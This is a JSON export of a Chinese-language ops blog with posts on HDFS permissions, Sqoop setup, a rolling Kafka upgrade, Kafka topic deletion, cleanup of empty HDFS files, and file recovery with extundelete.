参考：官网配置","text":"先了解下hdfs的超级用户概念 12345超级用户即运行name node进程的用户。例如，你使用了root用户启动了name node，那么root就是超级用户。当name node开始运行时，进程自动判断谁现在是超级用户。HDFS的超级用户不一定非得是name node主机上的超级用户，也不需要所有的集群的超级用户都是一个。另外，下面我们通过手动去指定一个用户作为hadoop超级管理员用户，也具有超级管理员权限。 开启hdfs权限检查1234&lt;property&gt; &lt;name&gt;dfs.permissions.enabled&lt;/name&gt; #启用权限检查 &lt;value&gt;true&lt;/value&gt;&lt;/property&gt; 注：修改完以上配置后，需要重启namenode hdfs服务 参考：官网配置 权限操作Linux创建用户和组 123456#创建用户和组useradd hdfs groupadd hadoop#将hdfs用户加入到hadoop组usermod -a -G hadoop hdfs 修改+查看hdfs的权限 12# hadoop fs -chmod -R 750 /# hadoop fs -ls / 修改查看hdfs文件/目录的所有者 12# hadoop fs -chown -R hdfs:hadoop /# hadoop fs -ls / 创建hdfs用户的hadoop目录 123456789[hdfs@master1 ~]$ hadoop fs -mkdir /hdfshome[hdfs@master1 ~]$ hadoop fs -ls /Found 5 itemsdrwxr-x--- - hdfs hadoop 0 2019-02-14 19:04 /hadoopdrwxr-x--- - hdfs hadoop 0 2019-03-12 11:12 /hdfshomedrwxr-x--- - hdfs hadoop 0 2019-03-08 18:24 /sqoopimdrwxr-x--- - hdfs hadoop 0 2019-03-08 17:38 /tmpdrwxr-x--- - hdfs hadoop 0 2019-02-14 19:23 /user 注：权限这块与linux原理完全相同，学会变通 权限验证1我们这里使用linux创建一个test用户，没有任何hadoop目录授权，重启namenode服务后，进行以下验证 使用test用户查看hdfs 1234[test@master1 ~]$ hadoop fs -ls &#x2F;ls: Permission denied: user&#x3D;test, access&#x3D;READ_EXECUTE, inode&#x3D;&quot;&#x2F;&quot;:hdfs:hadoop:drwxr-x---可以看到这里提示没有权限 使用hdfs用户查看hdfs 1234567[hdfs@master1 ~]$ hadoop fs -ls &#x2F;Found 5 itemsdrwxr-x--- - hdfs hadoop 0 2019-03-12 14:18 &#x2F;hadoopdrwxr-x--- - hdfs hadoop 0 2019-03-12 11:12 &#x2F;hdfshomedrwxr-x--- - hdfs hadoop 0 2019-03-08 18:24 &#x2F;sqoopimdrwxr-x--- - hdfs hadoop 0 2019-03-08 17:38 &#x2F;tmpdrwxr-x--- - hdfs hadoop 0 2019-02-14 19:23 &#x2F;user","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"hadoop用户","slug":"hadoop用户","permalink":"https://garywu520.github.io/tags/hadoop%E7%94%A8%E6%88%B7/"}]},{"title":"Mars-Hadoop Sqoop介绍及安装","slug":"Mars-Hadoop-Sqoop介绍及安装","date":"2019-03-08T08:53:51.000Z","updated":"2019-03-08T08:55:14.507Z","comments":true,"path":"2019/03/08/Mars-Hadoop-Sqoop介绍及安装/","link":"","permalink":"https://garywu520.github.io/2019/03/08/Mars-Hadoop-Sqoop%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%AE%89%E8%A3%85/","excerpt":"Sqoop介绍123sqoop是一款数据转换工具，主要用于在Hadoop(hive)与传统的数据库之间进行数据传递。可以将一个关系型数据库(例如：MySQL、Oracle、Postgres等)中的数据导入到Hadoop的HDFS中，也可以将HDFS的数据导出到关系型数据库中 官方网址-Apache Sqoop 使用文档-Apache Sqoop 123截止目前共计2个版本,选择其一即可：V1.4.7V1.99.7","text":"Sqoop介绍123sqoop是一款数据转换工具，主要用于在Hadoop(hive)与传统的数据库之间进行数据传递。可以将一个关系型数据库(例如：MySQL、Oracle、Postgres等)中的数据导入到Hadoop的HDFS中，也可以将HDFS的数据导出到关系型数据库中 官方网址-Apache Sqoop 使用文档-Apache Sqoop 123截止目前共计2个版本,选择其一即可：V1.4.7V1.99.7 解压并配置环境变量12tar -zxf sqoop-1.4.7.bin__hadoop-2.6.0.tar.gz -C &#x2F;optmv sqoop-1.4.7.bin__hadoop-2.6.0 sqoop-1.4.7 配置环境变量 /etc/profile 12export SQOOP_HOME&#x3D;&#x2F;opt&#x2F;sqoop-1.4.7export PATH&#x3D;$SQOOP_HOME&#x2F;bin:$PATH 1source &#x2F;etc&#x2F;profile 验证 123[root@master1 ~]# sqoop-version...19&#x2F;03&#x2F;06 12:28:32 INFO sqoop.Sqoop: Running Sqoop version: 1.4.7 导入MySQL JAR包12因为稍后会使用sqoop将操作MySQL数据到HDFS，所以，需要使用与MySQL版本一致的对应Jar包。下载好Jar包后，放入&#x2F;opt&#x2F;sqoop-1.4.7&#x2F;lib目录即可 MySQL Connector/J: 下载 123unzip mysql-connector-java-5.1.46.zip cd mysql-connector-java-5.1.46cp mysql-connector-java-5.1.46-bin.jar &#x2F;opt&#x2F;sqoop-1.4.7&#x2F;lib&#x2F; sqoop导入导出-说明导入 1234- 读数据(一行一行的读，即row by row)- 并行化执行- 导入结果可以是文本文件、二进制序列化文件等- 导入过程：sqoop会将导入&#x2F;导出的过程封装成java类文件，java类文件作用是用来封装导入表中的行等等 导出 1234将HDFS上的文件导出到关系型数据库指定的库或指定的组中- 并行化读取HDFS文件- 解析成关系型数据库所能识别的行级数据- 将这部分数据作为新的行插入到目标数据库的目标表中。 查看导入/导出的数据库的情况 123- 库 sqoop-list-databases- 表 sqoop-list-tables- 原生的SQL执行Shell: sqoop-eval 自定义导入/导出 123- 导入过程(可以导入&#x2F;导出某个库某张表特定的行或列、或指定分隔符...)- Java类代码生成- 导出过程 sqoop-help命令帮助 123456789101112131415Available commands: sqoop codegen 生成与数据库记录交互的代码 sqoop create-hive-table 将表的定义导入hive sqoop eval 评估SQL语句并显示结果 sqoop export 将HDFS目录导出到关系型数据库的表中 sqoop import 将关系型数据库中的表导入HDFS sqoop import-all-tables 将表从数据库导入HDFS sqoop import-mainframe 将数据集从大型机服务器导入HDFS sqoop job 执行已保存的作业 sqoop list-databases 列出服务器上的可用数据库 sqoop list-tables 列出服务器上的可用表 sqoop merge 合并增量导入 sqoop metastore 运行一个独立的Sqoop metastore sqoop version 线上版本信息 sqoop help 列出可用命令 sqoop工具使用 123456sqoop针对不同的需求开发出了不同的工具，故可以将sqoop理解为是一个工具箱。(1)首先需要确定想要干什么事情，然后使用某个工具。 比如:我想导入就使用sqoop-import；如果想进行导出就需要使用sqoop-export (2)确定命令的参数如何使用 查看具体某个命令(以import命令为例)的使用帮助 1sqoop help import","categories":[],"tags":[{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"sqoop","slug":"sqoop","permalink":"https://garywu520.github.io/tags/sqoop/"},{"name":"数据转换工具","slug":"数据转换工具","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7/"}]},{"title":"sz或rz下载乱码中断问题","slug":"sz或rz下载乱码中断问题","date":"2019-03-08T03:37:33.000Z","updated":"2019-03-08T03:45:26.839Z","comments":true,"path":"2019/03/08/sz或rz下载乱码中断问题/","link":"","permalink":"https://garywu520.github.io/2019/03/08/sz%E6%88%96rz%E4%B8%8B%E8%BD%BD%E4%B9%B1%E7%A0%81%E4%B8%AD%E6%96%AD%E9%97%AE%E9%A2%98/","excerpt":"","text":"有时候在ssh客户端下载文件，文件没有达到4GB上限，却下载出现乱码，以致于下载的文件不完整 注：以下解决方法仅限文本文件下载 解决方法-使用-a参数： 1-a, --ascii ASCII transfer (change CR&#x2F;LF to LF) 1sz -a filename","categories":[],"tags":[{"name":"lrzsz","slug":"lrzsz","permalink":"https://garywu520.github.io/tags/lrzsz/"},{"name":"sz","slug":"sz","permalink":"https://garywu520.github.io/tags/sz/"},{"name":"rz","slug":"rz","permalink":"https://garywu520.github.io/tags/rz/"},{"name":"zmodem ssh","slug":"zmodem-ssh","permalink":"https://garywu520.github.io/tags/zmodem-ssh/"}]},{"title":"shell递归检索所有空目录","slug":"shell递归检索所有空目录","date":"2019-03-08T02:41:10.000Z","updated":"2019-03-08T02:50:41.698Z","comments":true,"path":"2019/03/08/shell递归检索所有空目录/","link":"","permalink":"https://garywu520.github.io/2019/03/08/shell%E9%80%92%E5%BD%92%E6%A3%80%E7%B4%A2%E6%89%80%E6%9C%89%E7%A9%BA%E7%9B%AE%E5%BD%95/","excerpt":"","text":"shell脚本 123456789101112131415161718[root@hostname ~]$ cat scan.sh #!&#x2F;bin&#x2F;bashfunction read_dir &#123; #定义一个函数，名称为read_dir for file in &#96;ls -R $1&#96; #通过ls -R来遍历目录 do if [ -d $1&quot;&#x2F;&quot;$file ];then #如果它是一个目录,则进行文件统计 NUM&#x3D;&#96;ls $1&quot;&#x2F;&quot;$file|wc -l&#96; if [ $NUM -eq 0 ];then #如果文件统计结果为0则说明是空目录，就追加到文件 echo $1&quot;&#x2F;&quot;$file &gt;&gt;scan_dir.log fi read_dir $1&quot;&#x2F;&quot;$file #读取路径，继续目录递归 fi done&#125;read_dir $1 脚本执行 1time sh scan.sh [PATH...] 其他递归需求，可随意变通实现","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"shell脚本","slug":"shell脚本","permalink":"https://garywu520.github.io/tags/shell%E8%84%9A%E6%9C%AC/"},{"name":"递归目录","slug":"递归目录","permalink":"https://garywu520.github.io/tags/%E9%80%92%E5%BD%92%E7%9B%AE%E5%BD%95/"}]},{"title":"hadoop清空回收站","slug":"hadoop清空回收站","date":"2019-03-06T07:25:22.000Z","updated":"2019-03-06T07:54:41.814Z","comments":true,"path":"2019/03/06/hadoop清空回收站/","link":"","permalink":"https://garywu520.github.io/2019/03/06/hadoop%E6%B8%85%E7%A9%BA%E5%9B%9E%E6%94%B6%E7%AB%99/","excerpt":"","text":"直接删除目录(不放入回收站)1hadoop fs -rm -skipTrash &#x2F;path&#x2F;to&#x2F;file 如果不加-skipTrash，删除的目录会放入/user/hdfs/.Trash中。同时可以配置垃圾桶选项，设置时间间隔多久后自动清空 清空回收站12345$ hadoop fs -expunge输出内容大概如下：5&#x2F;03&#x2F;27 14:19:45 INFO fs.TrashPolicyDefault: Namenode trash configuration: Deletion interval &#x3D; 1 minutes, Emptier interval &#x3D; 0 minutes.15&#x2F;03&#x2F;27 14:19:46 INFO fs.TrashPolicyDefault: Created trash checkpoint: &#x2F;user&#x2F;hdfs&#x2F;.Trash&#x2F;150327141946 执行完命令后，回收站的数据不会立即被清理，而是先打了一个checkpoint。提示一分钟后清除。 参考：Emptying the HDFS Trash","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"Trash","slug":"Trash","permalink":"https://garywu520.github.io/tags/Trash/"},{"name":"expunge","slug":"expunge","permalink":"https://garywu520.github.io/tags/expunge/"}]},{"title":"KAFKA版本滚动升级","slug":"KAFKA版本滚动升级","date":"2019-03-05T06:54:26.000Z","updated":"2019-03-05T06:57:17.257Z","comments":true,"path":"2019/03/05/KAFKA版本滚动升级/","link":"","permalink":"https://garywu520.github.io/2019/03/05/KAFKA%E7%89%88%E6%9C%AC%E6%BB%9A%E5%8A%A8%E5%8D%87%E7%BA%A7/","excerpt":"环境现有环境(已有现有环境) 主机名 IP 角色 node111/brokerid:111 10.0.10.111 kafka 0.8.2.2/zookeeper node112/brokerid:112 10.0.10.112 kafka 0.8.2.2/zookeeper node113/brokerid:113 10.0.10.113 kafka 0.8.2.2/zookeeper 升级后环境 主机名 IP 角色 node111/brokerid:111 10.0.10.111 kafka 2.1.0/zookeeper node112/brokerid:112 10.0.10.112 kafka 2.1.0/zookeeper node113/brokerid:113 10.0.10.113 kafka 2.1.0/zookeeper","text":"环境现有环境(已有现有环境) 主机名 IP 角色 node111/brokerid:111 10.0.10.111 kafka 0.8.2.2/zookeeper node112/brokerid:112 10.0.10.112 kafka 0.8.2.2/zookeeper node113/brokerid:113 10.0.10.113 kafka 0.8.2.2/zookeeper 升级后环境 主机名 IP 角色 node111/brokerid:111 10.0.10.111 kafka 2.1.0/zookeeper node112/brokerid:112 10.0.10.112 kafka 2.1.0/zookeeper node113/brokerid:113 10.0.10.113 kafka 2.1.0/zookeeper 查看当前KAFKA版本号123456[root@node111 config]# cd &#x2F;opt&#x2F;kafka[root@node111 kafka]# find .&#x2F;libs&#x2F; -name \\*kafka_\\* | head -1 | grep -o &#39;\\kafka[^\\n]*&#39;kafka_2.10-0.8.2.2.jar注：这里 2.10是scala版本 0.8.2.2是kafka版本 升级JDK12新版本KAFKA要求JDK版本≥1.8,故需要提前升级JDK，否则会报如下经典错误：kafka&#x2F;Kafka : Unsupported major.minor version 52.0 12tar -zxf jdk-8u201-linux-x64.tar.gz mv jdk1.8.0_201 &#x2F;opt&#x2F; 1234#JDKexport JAVA_HOME&#x3D;&#x2F;opt&#x2F;jdk1.8.0_201export PATH&#x3D;$JAVA_HOME&#x2F;bin:$PATHexport CLASSPATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar 12source &#x2F;etc&#x2F;profilejava -version 一、配置KFAKA-2.1.00.8.2核心配置-以node111为例 1234broker.id&#x3D;111port&#x3D;9092log.dirs&#x3D;&#x2F;var&#x2F;log&#x2F;kafkazookeeper.connect&#x3D;10.0.10.111:2181,10.0.10.112:2181,10.0.10.113:2181 2.1.0核心配置-以node111为例 123456broker.id&#x3D;111listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;10.0.10.111:9092log.dirs&#x3D;&#x2F;var&#x2F;log&#x2F;kafkazookeeper.connect&#x3D;10.0.10.111:2181,10.0.10.112:2181,10.0.10.113:2181inter.broker.protocol.version&#x3D;0.8.2.2log.message.format.version&#x3D;0.8.2.2 重复以上步骤，将node112和node113 KAFKA安装配置完毕。 注意事项 12345-- 新版本与旧版本的log.dirs指定相同的路径，否则会导致信息丢失-- 新版本于旧版本broker.id保持一致。-- 需要在新版本的server.properties中，写入以下信息，这两个参数很重要！ inter.broker.protocol.version&#x3D;旧版本号 log.message.format.version&#x3D;旧版本号 二、 关闭老实例，启动新实例 对于0.8.1.x版本 1234在Kafka-0.8.1.x版本中，Kafka源码中&#x2F;kafka&#x2F;admin&#x2F;目录下有ShutdownBroker这个类，可以通过这个类实现优雅下线方法：sh kafka-run-class.sh kafka.admin.ShutdownBroker --zookeeper 172.18.055.21:2181 --broker 111 --num.retries 3 --retry.interval.ms 600 对于0.8.2+版本 123afka.admin.ShutdownBroker这个类被移除了，因此不能通过上述方法实现停机。在Kafka-0.8.2+版本中，可以直接运行kill pid，但不要kill -9 pid。 将node111节点老版本KAFKA实例停止运行 1234[root@node111 config]# jps -m30174 Kafka &#x2F;opt&#x2F;kafka&#x2F;config&#x2F;server.properties[root@node111 config]# kill 30174 执行命令后可能需要稍等一会儿 启动node111节点新版本KAFKA实例 12【新版本支持】以守护方式启动kafka[root@node111]# &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;bin&#x2F;kafka-server-start.sh -daemon &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;config&#x2F;server.properties 其他节点也是通过这种方法实现服务停止和服务启动 验证kafka新版本 123[root@node111 ~]# cd &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;[root@node111 kafka_2.12-2.1.0]# find .&#x2F;libs&#x2F; -name \\*kafka_\\* | head -1 | grep -o &#39;\\kafka[^\\n]*&#39;kafka_2.12-2.1.0.jar 三、更新协议版本1当集群中所有KAFKA节点都升级完毕后，就开始逐个升级protocol版本了，通过inter.broker.protocol.version这个配置选项，设置为2.1.0 1sed -i &#39;s&#x2F;inter.broker.protocol.version&#x3D;0.8.2.2&#x2F;inter.broker.protocol.version&#x3D;2.1.0&#x2F;&#39; &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;config&#x2F;server.properties 123验证配置文件修改grep &quot;inter.broker.protocol.version&quot; &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;config&#x2F;server.propertiesinter.broker.protocol.version&#x3D;2.1.0 1234重启KAFKA节点使新协议生效&#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;bin&#x2F;kafka-server-stop.shjps -m&#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;bin&#x2F;kafka-server-start.sh -daemon &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;config&#x2F;server.properties 其他kafka节点也需要逐一修改和节点重启 四、更新日志格式版本1通过log.message.format.version参数更新日志格式版本，设置为2.1.0 1sed -i &#39;s&#x2F;log.message.format.version&#x3D;0.8.2.2&#x2F;log.message.format.version&#x3D;2.1.0&#x2F;&#39; &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;config&#x2F;server.properties 123验证配置文件修改grep &quot;log.message.format.version&quot; &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;config&#x2F;server.propertieslog.message.format.version&#x3D;2.1.0 1234重启KAFKA节点使新协议生效&#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;bin&#x2F;kafka-server-stop.shjps -m&#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;bin&#x2F;kafka-server-start.sh -daemon &#x2F;opt&#x2F;kafka_2.12-2.1.0&#x2F;config&#x2F;server.properties 其他kafka节点也需要逐一修改和节点重启 五、验证新版本KAFKA数据12345查看topic list[root@node111 kafka_2.10-0.8.2.2]# bin&#x2F;kafka-topics.sh --zookeeper 10.0.10.112:2181 --list__consumer_offsetsgarywugarywu2 12345678910111213查看topic[root@node111 kafka_2.10-0.8.2.2]# bin&#x2F;kafka-topics.sh --describe --zookeeper 10.0.10.112:2181 --topic garywu2Topic:garywu2 PartitionCount:10 ReplicationFactor:3 Configs: Topic: garywu2 Partition: 0 Leader: 111 Replicas: 111,112,113 Isr: 113,112,111 Topic: garywu2 Partition: 1 Leader: 112 Replicas: 112,113,111 Isr: 113,112,111 Topic: garywu2 Partition: 2 Leader: 113 Replicas: 113,111,112 Isr: 113,112,111 Topic: garywu2 Partition: 3 Leader: 111 Replicas: 111,113,112 Isr: 113,112,111 Topic: garywu2 Partition: 4 Leader: 112 Replicas: 112,111,113 Isr: 113,112,111 Topic: garywu2 Partition: 5 Leader: 113 Replicas: 113,112,111 Isr: 113,112,111 Topic: garywu2 Partition: 6 Leader: 111 Replicas: 111,112,113 Isr: 113,112,111 Topic: garywu2 Partition: 7 Leader: 112 Replicas: 112,113,111 Isr: 113,112,111 Topic: garywu2 Partition: 8 Leader: 113 Replicas: 113,111,112 Isr: 113,112,111 Topic: garywu2 Partition: 9 Leader: 111 Replicas: 111,113,112 Isr: 113,112,111 注意事项1234(1) 如果为生产环境不接受宕机，那么请严格按照此步骤进行滚动升级(2) 当brokers成功升级后，设定版本协议、日志格式版本以及重启操作，可以在业务影响较小的时间段进行逐一重启。(3) 由于kafka新版本与0.8+版本的客户端API兼容，因此在完成brokers升级后，即便protocal和log日志格式版本设置为旧版本，也不影响调用。(4) KAFKA broker的PID被kill之后，会触发KAFKA Partation的leader重新选举，在选举过程中，producer发送的消息会发送失败；与此同时，consumer也无法消费到发送失败的消息。 参考：石头头头的博客","categories":[],"tags":[{"name":"broker","slug":"broker","permalink":"https://garywu520.github.io/tags/broker/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"KAFKA","slug":"KAFKA","permalink":"https://garywu520.github.io/tags/KAFKA/"},{"name":"KAFKA版本升级","slug":"KAFKA版本升级","permalink":"https://garywu520.github.io/tags/KAFKA%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"}]},{"title":"kafka删除Topic","slug":"kafka删除Topic","date":"2019-02-28T11:13:37.000Z","updated":"2019-03-01T03:58:49.418Z","comments":true,"path":"2019/02/28/kafka删除Topic/","link":"","permalink":"https://garywu520.github.io/2019/02/28/kafka%E5%88%A0%E9%99%A4Topic/","excerpt":"查看所有Topic1bin&#x2F;kafka-topics --zookeeper zkserver:2181 --list 注意12345如果需要被删除topic 此时正在被程序 produce和consume，则这些生产和消费程序需要停止。因为如果有程序正在生产或者消费该topic，则该topic的offset信息一致会在broker更新。调用kafka delete命令则无法删除该topic。同时，需要设置 auto.create.topics.enable &#x3D; false，默认设置为true。如果设置为true，则produce或者fetch 不存在的topic也会自动创建这个topic。这样会给删除topic带来很多意想不到的问题。","text":"查看所有Topic1bin&#x2F;kafka-topics --zookeeper zkserver:2181 --list 注意12345如果需要被删除topic 此时正在被程序 produce和consume，则这些生产和消费程序需要停止。因为如果有程序正在生产或者消费该topic，则该topic的offset信息一致会在broker更新。调用kafka delete命令则无法删除该topic。同时，需要设置 auto.create.topics.enable &#x3D; false，默认设置为true。如果设置为true，则produce或者fetch 不存在的topic也会自动创建这个topic。这样会给删除topic带来很多意想不到的问题。 删除Topic KAFKA删除Topic 12bin&#x2F;kafka-topics --delete --zookeeper zkserver:2181 --topic [topic-name]提示: Topic xxx is marked for deletion. 1如果KAFKA配置文件server.properties中，没有指定delete.topic.enable&#x3D;true参数，那么运行了此命令并不是真的删除, 而是把topic标记为：marked for deletion。 zookeeper删除Topic 123bin&#x2F;zkCli.sh -server zkserver:2181ls &#x2F;brokers&#x2F;topics找到要删除的topic，执行命令：rmr &#x2F;brokers&#x2F;topics&#x2F;[topic name] 删除KAFKA存储目录 1也就是server.properties文件log.dirs配置的目录，删除对应的topic分区数据 ​ 参考：云+社区","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"topic","slug":"topic","permalink":"https://garywu520.github.io/tags/topic/"},{"name":"删除topic","slug":"删除topic","permalink":"https://garywu520.github.io/tags/%E5%88%A0%E9%99%A4topic/"}]},{"title":"查看kafka消费者group列表","slug":"查看kafka消费者group列表","date":"2019-02-27T10:26:17.000Z","updated":"2019-02-27T10:34:11.915Z","comments":true,"path":"2019/02/27/查看kafka消费者group列表/","link":"","permalink":"https://garywu520.github.io/2019/02/27/%E6%9F%A5%E7%9C%8Bkafka%E6%B6%88%E8%B4%B9%E8%80%85group%E5%88%97%E8%A1%A8/","excerpt":"","text":"查看KAFKA消费者组列表–consumer groups方法11bin&#x2F;kafka-consumer-groups.sh --zookeeper 127.0.0.1:2181 --list 方法2有的生产环境可能使用的早期0.8.2的版本，可以通过zookeeper查看 1bin&#x2F;zkCli.sh -server 127.0.0.1:2181 123列出的就是consumer groups了[zk: 127.0.0.1:2181(CONNECTED) 6] ls &#x2F;consumers&#x2F; 123这条命令可以看到此组下有哪些topic[zk: 127.0.0.1:2181(CONNECTED) 6] ls &#x2F;consumers&#x2F;consumer_groupname&#x2F;owners","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"consumer","slug":"consumer","permalink":"https://garywu520.github.io/tags/consumer/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"CDH-找不到MySQL JDBC驱动程序","slug":"CDH-找不到MySQL-JDBC驱动程序","date":"2019-02-26T06:39:10.000Z","updated":"2019-02-26T06:52:10.280Z","comments":true,"path":"2019/02/26/CDH-找不到MySQL-JDBC驱动程序/","link":"","permalink":"https://garywu520.github.io/2019/02/26/CDH-%E6%89%BE%E4%B8%8D%E5%88%B0MySQL-JDBC%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/","excerpt":"123CDH添加角色实例过程中，提示： 找不到JDBC驱动程序报错： JDBC driver cannot be found. Unable to find the JDBC database jar on host 1. 首先确认MySQL版本1略 2. 下载对应版本的JDBC1如果MySQL的版本是 5.1.97, 那么mysql-connector-java驱动就可以下载版本V5.1.xx均可使用 下载：Google 搜索关键字：“mysql-connector-java 5.1”","text":"123CDH添加角色实例过程中，提示： 找不到JDBC驱动程序报错： JDBC driver cannot be found. Unable to find the JDBC database jar on host 1. 首先确认MySQL版本1略 2. 下载对应版本的JDBC1如果MySQL的版本是 5.1.97, 那么mysql-connector-java驱动就可以下载版本V5.1.xx均可使用 下载：Google 搜索关键字：“mysql-connector-java 5.1” 3. 下载后将包文件放到以下目录1234我这里是CDH，安装目录为：&#x2F;opt&#x2F;cloudera&#x2F;parcels&#x2F;CDH&#x2F;lib&#x2F;hive&#x2F;lib或&#x2F;opt&#x2F;cloudera&#x2F;parcels&#x2F;CDH-5.4.0-1.cdh5.4.0.p0.27&#x2F;lib&#x2F;hive&#x2F;lib 1如果仍出现错误，接着进行如下步骤. 注意修改Jar包文件名 12mkdir -p &#x2F;usr&#x2F;share&#x2F;javals -lh &#x2F;usr&#x2F;share&#x2F;java&#x2F;mysql-connector-java.jar","categories":[],"tags":[{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"JDBC","slug":"JDBC","permalink":"https://garywu520.github.io/tags/JDBC/"},{"name":"MySQL驱动","slug":"MySQL驱动","permalink":"https://garywu520.github.io/tags/MySQL%E9%A9%B1%E5%8A%A8/"}]},{"title":"Hadoop HDFS 0字节空文件清理","slug":"Hadoop-HDFS 0字节空文件清理","date":"2019-02-21T04:22:55.000Z","updated":"2019-02-21T05:58:09.185Z","comments":true,"path":"2019/02/21/Hadoop-HDFS 0字节空文件清理/","link":"","permalink":"https://garywu520.github.io/2019/02/21/Hadoop-HDFS%200%E5%AD%97%E8%8A%82%E7%A9%BA%E6%96%87%E4%BB%B6%E6%B8%85%E7%90%86/","excerpt":"","text":"1Hadoop集群运行久了，就难免出现很多0字节空文件或者20字节空gz后缀文件。就需要批量清理 1由于我当前使用的hadoop版本原因，hdfs shell命令无find命令，不方便只检索出文件，故使用ls命令来检索并清理。 12345678hadoop fs -ls -R &#x2F;cleandata |grep &quot;gz&quot;|awk &#39;&#123; if ($5 &#x3D;&#x3D; 0) print $8 &#125;&#39;|xargs hadoop fs -rmhadoop fs -ls -R &#x2F;cleandata |grep &quot;gz&quot;|awk &#39;&#123; if ($5 &#x3D;&#x3D; 20) print $8 &#125;&#39;|xargs hadoop fs -rm其中，需要自定义hdfs目录 $5 是列出的文件大小,单位字节 $8 是列出的文件路径 如果不使用grep,ls命令检索结果会包含目录,所以-rm清理的时候会报错提示是目录而无法删除目录，变相实现了删除文件的方案(切记rm不要使用-r参数)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"hdfs空文件","slug":"hdfs空文件","permalink":"https://garywu520.github.io/tags/hdfs%E7%A9%BA%E6%96%87%E4%BB%B6/"},{"name":"hadoop fs","slug":"hadoop-fs","permalink":"https://garywu520.github.io/tags/hadoop-fs/"}]},{"title":"linux误删除恢复-extundelete","slug":"linux误删除恢复-extundelete","date":"2019-02-19T09:14:00.000Z","updated":"2019-02-20T06:34:41.655Z","comments":true,"path":"2019/02/19/linux误删除恢复-extundelete/","link":"","permalink":"https://garywu520.github.io/2019/02/19/linux%E8%AF%AF%E5%88%A0%E9%99%A4%E6%81%A2%E5%A4%8D-extundelete/","excerpt":"描述1脚本批量更新文件名称， 缺少一个for循环导致变量没有生效，mv操作覆盖了文件。 使用的工具1234567extundelete(1)此工具适用于rm误删除或mv误删除操作恢复(2)已验证文件系统：Ext4(3)适用于大文件恢复，我这里是单压缩文件22GB注：此工具请勿安装在误删的文件所在磁盘上","text":"描述1脚本批量更新文件名称， 缺少一个for循环导致变量没有生效，mv操作覆盖了文件。 使用的工具1234567extundelete(1)此工具适用于rm误删除或mv误删除操作恢复(2)已验证文件系统：Ext4(3)适用于大文件恢复，我这里是单压缩文件22GB注：此工具请勿安装在误删的文件所在磁盘上 使用说明123一旦误操作导致数据丢失后，应立即umount卸载所挂载的对应磁盘，不能再写入数据，不然谁都帮不了你。卸载挂载: umount &#x2F;data&#x2F;B 恢复过程(1) 查看已删除文件的 inode 123extundelete &#x2F;dev&#x2F;sdb1 --inode 2通过扫描发现了我们删除的文件夹 (2) 查看对应inode目录的已删除文件(可选) 123extundelete &#x2F;dev&#x2F;sdb1 --inode &lt;对应innode值&gt;示例：extundelete &#x2F;dev&#x2F;sdb --inode 57542043 (3) 这里我恢复所有删除的数据 1234567cd &#x2F;data&#x2F;A&#x2F;restory #进入要恢复的目录（不是原丢失目录，切记）extundelete &#x2F;dev&#x2F;sdb1 --restore-all 